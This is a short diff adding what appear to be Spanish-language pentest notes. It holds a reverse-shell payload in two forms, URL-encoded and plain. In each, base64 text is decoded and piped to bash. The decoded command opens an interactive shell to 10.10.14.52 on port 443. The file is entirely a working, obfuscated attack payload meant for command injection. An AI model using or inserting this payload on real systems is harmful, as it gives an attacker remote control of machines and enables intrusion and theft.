@@ -1,0 +1,6 @@
+# Combinando con url encode -> %20 Es un espacio
+echo%20YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Mi80NDMgMD4mMQo=|base64%20-d|bash
+
+# Sin url encode
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Mi80NDMgMD4mMQo=|base64 -d|bash
+
